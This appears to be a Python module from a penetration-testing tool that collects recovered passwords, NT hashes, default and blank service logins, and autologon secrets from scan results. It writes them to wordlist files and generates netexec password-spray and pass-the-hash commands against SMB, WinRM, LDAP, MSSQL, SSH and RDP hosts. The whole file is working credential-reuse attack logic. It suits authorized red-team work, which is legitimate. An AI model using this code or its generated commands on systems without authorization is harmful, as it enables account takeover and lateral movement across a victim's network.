"""Credential stacking + spray planning.

Stacks every credential recce has seen (auto-harvested from AD accounts with a
recovered secret, default/blank service logins, and autologon/stored creds in
ingested loot) together with any the tester captured by hand, deduped into one
set. From that set + the discovered remote-access surface it builds a spray plan:
the exact netexec / impacket commands to validate and reuse the credentials
across SMB / WinRM / LDAP / MSSQL / RDP / SSH, and writes users/passwords/hashes
files ready to feed those tools. Uses existing tools only; runs nothing itself.
"""
from __future__ import annotations

import os
import re

from .models import Credential, Host


# --- auto-harvest from what recce already knows -------------------------------
_AUTOLOGON = re.compile(
    r"autologon password.*user\s*=\s*(?P<u>[^\s]+)\s+password\s*=\s*(?P<p>.+)", re.I)
_PG_DEFAULT = re.compile(r"postgresql login works:\s*(?P<u>\w+)\s*/\s*'?(?P<p>[^'\s]*)", re.I)
_BLANK_LOGIN = re.compile(
    r"(?:mysql|postgresql|mssql).*login.*user\s*=?\s*'?(?P<u>\w+)'?.*"
    r"(?:no password|blank|/ *'?<?blank)", re.I)


def _harvest_host(h: Host) -> list[Credential]:
    out: list[Credential] = []
    # 1) AD accounts carrying a recovered secret.
    for a in h.accounts:
        attrs = a.attrs or {}
        pw = attrs.get("password") or attrs.get("cleartext")
        nt = attrs.get("hash") or attrs.get("ntlm")
        if pw:
            out.append(Credential(username=a.name, secret=str(pw), kind="password",
                                  domain=a.domain, source=a.source or "ad",
                                  origin_ip=h.ip))
        elif nt:
            out.append(Credential(username=a.name, secret=str(nt), kind="nthash",
                                  domain=a.domain, source=a.source or "ad",
                                  origin_ip=h.ip))
    # 2) Default / blank service logins + autologon, from findings & loot text.
    texts = [f"{v.title} {v.output}" for v in h.vulns]
    texts += [f.get("vector", "") for f in getattr(h, "local_findings", []) or []]
    for t in texts:
        m = _AUTOLOGON.search(t)
        if m:
            out.append(Credential(username=m.group("u"), secret=m.group("p").strip(),
                                  kind="password", source="autologon", origin_ip=h.ip))
            continue
        m = _PG_DEFAULT.search(t)
        if m:
            out.append(Credential(username=m.group("u"), secret=m.group("p"),
                                  kind="password" if m.group("p") else "blank",
                                  source="default", origin_ip=h.ip,
                                  notes="default PostgreSQL login"))
            continue
        m = _BLANK_LOGIN.search(t)
        if m:
            out.append(Credential(username=m.group("u"), secret="", kind="blank",
                                  source="default", origin_ip=h.ip,
                                  notes="blank/no-password service login"))
    return out


def harvest(hosts: list[Host]) -> list[Credential]:
    out = []
    for h in hosts:
        out.extend(_harvest_host(h))
    return out


def stack(hosts: list[Host], stored: list[Credential] | None = None) -> list[Credential]:
    """Merge auto-harvested + manually-stored credentials, deduped by identity."""
    seen: set[str] = set()
    out: list[Credential] = []
    for c in (stored or []) + harvest(hosts):
        k = c.dedupe_key()
        if k in seen:
            continue
        seen.add(k)
        out.append(c)
    return out


# --- spray planning -----------------------------------------------------------
def spray_targets(hosts: list[Host]) -> dict[str, list[str]]:
    """The IPs that expose each sprayable protocol."""
    def ips(*ports):
        ps = set(ports)
        return sorted({h.ip for h in hosts if ps & {p.portid for p in h.open_ports}})
    return {"smb": ips(445, 139), "winrm": ips(5985, 5986), "ldap": ips(389, 3268),
            "mssql": ips(1433), "rdp": ips(3389), "ssh": ips(22)}


def _target_expr(ips: list[str]) -> str:
    """A compact target expression for netexec (one /24 if they share it, else list)."""
    if not ips:
        return ""
    nets = {".".join(ip.split(".")[:3]) + ".0/24" for ip in ips}
    return nets.pop() if len(nets) == 1 else " ".join(ips)


def write_files(creds: list[Credential], out_dir: str) -> dict[str, str]:
    """Write users.txt / passwords.txt / nthashes.txt for the stacked set."""
    os.makedirs(out_dir, exist_ok=True)
    users, passwords, hashes = [], [], []
    for c in creds:
        if c.username and c.username not in users:
            users.append(c.username)
        if c.kind == "password" and c.secret and c.secret not in passwords:
            passwords.append(c.secret)
        if c.kind == "nthash" and c.secret and c.secret not in hashes:
            hashes.append(c.secret)
    files = {}
    for name, rows in (("users.txt", users), ("passwords.txt", passwords),
                       ("nthashes.txt", hashes)):
        if rows:
            path = os.path.join(out_dir, name)
            with open(path, "w") as fh:
                fh.write("\n".join(rows) + "\n")
            files[name] = path
    return files


def spray_commands(creds: list[Credential], hosts: list[Host],
                   files: dict[str, str]) -> list[str]:
    """netexec/impacket spray commands for the protocols present in scope."""
    targets = spray_targets(hosts)
    has_pw = any(c.kind == "password" and c.secret for c in creds)
    has_nt = any(c.kind == "nthash" and c.secret for c in creds)
    has_blank = any(c.kind == "blank" or not c.secret for c in creds)
    u = "users.txt"
    lines: list[str] = []
    for proto in ("smb", "winrm", "ldap", "mssql", "ssh"):
        ips = targets.get(proto) or []
        if not ips:
            continue
        tgt = _target_expr(ips)
        lines.append(f"# {proto.upper()}  ({len(ips)} host(s))")
        if has_pw:
            lines.append(f"netexec {proto} {tgt} -u {u} -p passwords.txt "
                         f"--continue-on-success --no-bruteforce")
        if has_nt and proto in ("smb", "winrm", "ldap", "mssql"):
            lines.append(f"netexec {proto} {tgt} -u {u} -H nthashes.txt "
                         f"--continue-on-success --no-bruteforce   # pass-the-hash")
        if has_blank and proto in ("smb", "mssql"):
            lines.append(f"netexec {proto} {tgt} -u {u} -p '' --continue-on-success")
    if targets.get("rdp"):
        lines.append(f"# RDP  ({len(targets['rdp'])} host(s)) - validate, then log in")
        lines.append(f"netexec rdp {_target_expr(targets['rdp'])} -u {u} "
                     f"-p passwords.txt --continue-on-success")
    return lines


def build_spray(creds: list[Credential], hosts: list[Host], out_dir: str) -> dict:
    """Write the credential files + assemble the spray plan. Returns a summary."""
    cred_dir = os.path.join(out_dir, "creds")
    files = write_files(creds, cred_dir)
    commands = spray_commands(creds, hosts, files)
    return {"dir": cred_dir, "files": files, "commands": commands,
            "targets": spray_targets(hosts)}
